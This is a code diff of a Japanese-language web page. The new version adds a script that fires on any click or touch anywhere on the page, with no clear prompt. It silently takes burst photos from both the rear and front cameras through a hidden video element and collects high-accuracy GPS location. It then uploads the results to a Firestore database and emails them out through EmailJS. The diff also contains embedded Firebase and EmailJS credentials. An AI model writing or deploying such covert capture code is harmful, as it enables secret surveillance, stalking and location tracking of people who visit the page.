@@ -1,109 +1,196 @@
 <!DOCTYPE html>
 <html lang="ja">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Firestore Base64保存</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: #333; color: #fff; padding: 20px;
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Firestore & EmailJS 連写＋位置情報送信</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: #222; color: #eee;
+    padding: 20px;
+    user-select:none;
+  }
+  #status {
+    background: rgba(0,0,0,0.7);
+    padding: 10px;
+    border-radius: 6px;
+    max-height: 150px;
+    overflow-y: auto;
+    white-space: pre-wrap;
+    font-family: monospace;
+    margin-bottom: 20px;
+  }
+  .photo-preview img {
+    width: 120px;
+    margin: 5px;
+    border: 2px solid #555;
+    border-radius: 4px;
+  }
+  h1 {
+    text-align:center;
+  }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
+  import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";
+
+  // Firebase設定
+  const firebaseConfig = {
+    apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
+    authDomain: "picture-storage-906ae.firebaseapp.com",
+    projectId: "picture-storage-906ae",
+    storageBucket: "picture-storage-906ae.firebasestorage.app",
+    messagingSenderId: "134265329367",
+    appId: "1:134265329367:web:b94063426b6307f8a8c292",
+    measurementId: "G-9CP3F27EMF"
+  };
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  // EmailJS初期化
+  emailjs.init("cPjKBUm_i6HebDQF7");
+
+  // DOM要素
+  const statusEl = document.getElementById("status");
+
+  let busy = false;
+
+  function log(text) {
+    console.log(text);
+    statusEl.textContent += text + "\n";
+    statusEl.scrollTop = statusEl.scrollHeight;
+  }
+
+  // カメラ起動→連写（3枚、0.05秒間隔）
+  async function capturePhotos(facingMode) {
+    log(`📸 ${facingMode}カメラ起動`);
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode }, audio: false });
+    const video = document.createElement("video");
+    video.style.display = "none";
+    document.body.appendChild(video);
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth || 640;
+    canvas.height = video.videoHeight || 480;
+    const ctx = canvas.getContext("2d");
+
+    const photos = [];
+    for (let i = 0; i < 3; i++) {
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      const dataUrl = canvas.toDataURL("image/jpeg", 0.3);
+      photos.push(dataUrl);
+      log(`撮影 ${i+1} 枚目 サイズ: ${Math.round((dataUrl.length*3)/4/1024)} KB`);
+      await new Promise(r => setTimeout(r, 50));
     }
-    .photo { margin: 10px; }
-    .photo img { width: 250px; border: 2px solid #fff; margin-right: 10px; }
-    .btn { background: #4caf50; color: white; padding: 10px; cursor: pointer; }
-    .status { margin-top: 10px; color: #ffd700; }
-  </style>
+    stream.getTracks().forEach(t => t.stop());
+    video.remove();
+    return photos;
+  }
+
+  // 位置情報取得
+  function getLocation() {
+    log("📍 位置情報取得開始");
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        reject(new Error("位置情報非対応"));
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(pos => {
+        const loc = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          acc: pos.coords.accuracy,
+          time: new Date(pos.timestamp).toLocaleString()
+        };
+        log(`位置情報取得成功: 緯度${loc.lat}, 経度${loc.lon}, 精度${loc.acc}m`);
+        resolve(loc);
+      }, err => {
+        log(`⚠️ 位置情報取得失敗: ${err.message}`);
+        resolve({ lat: "不明", lon: "不明", acc: "不明", time: new Date().toLocaleString() });
+      }, { enableHighAccuracy: true, timeout: 10000 });
+    });
+  }
+
+  // Firestoreに保存
+  async function saveToFirestore(data) {
+    log("⬆️ Firestoreに保存中...");
+    try {
+      await addDoc(collection(db, "photos_with_location"), data);
+      log("✅ Firestore保存完了");
+    } catch(e) {
+      log("❌ Firestore保存失敗: " + e.message);
+    }
+  }
+
+  // EmailJS送信
+  async function sendEmail(data) {
+    log("✉️ EmailJS送信中...");
+    try {
+      await emailjs.send('service_ja2c09x', 'template_2fp2jrg', data);
+      log("✅ Email送信完了");
+    } catch(e) {
+      log("❌ Email送信失敗: " + e.message);
+    }
+  }
+
+  // メイン処理
+  async function runProcess() {
+    if(busy) {
+      log("❌ 処理中です。二重実行防止");
+      return;
+    }
+    busy = true;
+    log("🔄 処理開始");
+
+    try {
+      // 外カメ連写
+      const rearPhotos = await capturePhotos("environment");
+      // 内カメ連写
+      const frontPhotos = await capturePhotos("user");
+      // 位置情報取得
+      const location = await getLocation();
+
+      // Firestore用オブジェクト作成
+      const firestoreData = {
+        rearPhotos,
+        frontPhotos,
+        location,
+        createdAt: new Date().toISOString(),
+      };
+      await saveToFirestore(firestoreData);
+
+      // EmailJS用テンプレートパラメータ整形
+      const templateParams = {
+        photo_rear1: rearPhotos[0],
+        photo_rear2: rearPhotos[1],
+        photo_rear3: rearPhotos[2],
+        photo_front1: frontPhotos[0],
+        photo_front2: frontPhotos[1],
+        photo_front3: frontPhotos[2],
+        location_info: `緯度: ${location.lat}<br>経度: ${location.lon}<br>精度: ${location.acc}m<br>時刻: ${location.time}`,
+        date: new Date().toLocaleString()
+      };
+      await sendEmail(templateParams);
+
+      log("🎉 処理完了！");
+    } catch(e) {
+      log("❌ 全体処理エラー: " + e.message);
+    } finally {
+      busy = false;
+    }
+  }
+
+  // ページ全体クリック・タッチで処理実行
+  window.addEventListener("click", runProcess);
+  window.addEventListener("touchstart", runProcess, { passive: false });
+</script>
 </head>
 <body>
-  <h1>📸 撮影 → Firestore保存 → 表示</h1>
-  <button class="btn" id="captureBtn">撮影・保存</button>
-  <div class="status" id="status">待機中</div>
-  <div class="photo" id="photoArea"></div>
-
-  <video id="video" autoplay playsinline style="display:none;"></video>
-  <canvas id="canvas" style="display:none;"></canvas>
-
-  <script type="module">
-    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-app.js";
-    import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs } from "https://www.gstatic.com/firebasejs/11.10.0/firebase-firestore.js";
-
-    const firebaseConfig = {
-      apiKey: "AIzaSyDgwbExA5BKTcKsq2Ov8z173Ke6EPYGf28",
-      authDomain: "picture-storage-906ae.firebaseapp.com",
-      projectId: "picture-storage-906ae",
-      storageBucket: "picture-storage-906ae.firebasestorage.app",
-      messagingSenderId: "134265329367",
-      appId: "1:134265329367:web:b94063426b6307f8a8c292",
-      measurementId: "G-9CP3F27EMF"
-    };
-
-    const app = initializeApp(firebaseConfig);
-    const db = getFirestore(app);
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const status = document.getElementById('status');
-    const photoArea = document.getElementById('photoArea');
-
-    function logStatus(msg) {
-      status.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
-      console.log(msg);
-    }
-
-    async function startCamera() {
-      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false });
-      video.srcObject = stream;
-      await new Promise(r => setTimeout(r, 1000));
-    }
-
-    async function takePhoto() {
-      const ctx = canvas.getContext("2d");
-      canvas.width = video.videoWidth || 640;
-      canvas.height = video.videoHeight || 480;
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-      return canvas.toDataURL("image/jpeg", 0.3); // 圧縮率調整
-    }
-
-    async function uploadToFirestore(base64, type = "rear") {
-      const docRef = await addDoc(collection(db, "images"), {
-        imageData: base64,
-        type: type,
-        time: new Date().toISOString()
-      });
-      logStatus("✅ Firestoreに保存: " + docRef.id);
-    }
-
-    async function showLatestImages() {
-      photoArea.innerHTML = "";
-      const q = query(collection(db, "images"), orderBy("time", "desc"), limit(5));
-      const snapshot = await getDocs(q);
-      snapshot.forEach(doc => {
-        const data = doc.data();
-        const img = document.createElement("img");
-        img.src = data.imageData;
-        photoArea.appendChild(img);
-      });
-    }
-
-    document.getElementById("captureBtn").addEventListener("click", async () => {
-      try {
-        logStatus("📸 カメラ起動中...");
-        await startCamera();
-        logStatus("📷 撮影中...");
-        const base64 = await takePhoto();
-        logStatus("⬆️ Firestoreへアップロード...");
-        await uploadToFirestore(base64);
-        logStatus("🖼️ 表示中...");
-        await showLatestImages();
-        logStatus("✅ 完了！");
-      } catch (e) {
-        console.error(e);
-        logStatus("❌ エラー発生: " + e.message);
-      } finally {
-        if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
-      }
-    });
-  </script>
+<h1>📸 Firestore保存＋EmailJS送信</h1>
+<pre id="status">待機中...</pre>
 </body>
 </html>
